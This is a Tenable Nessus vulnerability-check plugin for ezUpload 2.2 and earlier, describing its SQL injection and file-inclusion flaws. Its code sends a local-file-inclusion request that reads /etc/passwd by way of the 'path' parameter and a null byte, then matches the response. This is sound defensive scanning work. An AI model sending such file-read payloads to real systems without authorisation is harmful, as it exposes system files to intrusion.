#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19418);
  script_version("$Revision: 1.23 $");

  script_cve_id("CVE-2005-2616", "CVE-2005-4308", "CVE-2005-4309");
  script_bugtraq_id(14534, 15918, 15919);
  script_osvdb_id(18763, 18764, 18765, 18766, 21911, 21912);

  script_name(english:"ezUpload <= 2.2 Multiple Remote Vulnerabilities (SQLi, RFI, LFI)");
  script_summary(english:"Checks for multiple vulnerabilities in ezUpload <= 2.2");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running ezUpload, a commercial upload
script written in PHP. 

The installed version of ezUpload allows remote attackers to control
the 'path' and 'mode' parameters used when including PHP code in
several scripts.  By leveraging this flaw, an attacker may be able to
view arbitrary files on the remote host and execute arbitrary PHP
code, possibly taken from third-party hosts.  Successful exploitation
may depend on PHP's 'magic_quotes_gpc' and 'allow_url_fopen' settings. 

In addition, it reportedly fails to sanitize input passed to various
parameters in the search module before using it in database queries,
which opens the application up to SQL injection as well as cross-site
scripting attacks." );
 # http://web.archive.org/web/20051030033134/http://packetstorm.linuxsecurity.com/0508-exploits/ezuploadRemote.txt
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f9d74b1d" );
 script_set_attribute(attribute:"see_also", value:"http://pridels.blogspot.com/2005/12/ezupload-pro-vuln.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/11");
 script_cvs_date("$Date: 2015/02/03 17:40:02 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencie("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the flaws to read /etc/passwd.
  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/file.php?",
      "path=/etc/passwd%00"
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning.*: *main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning.*: .+ Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
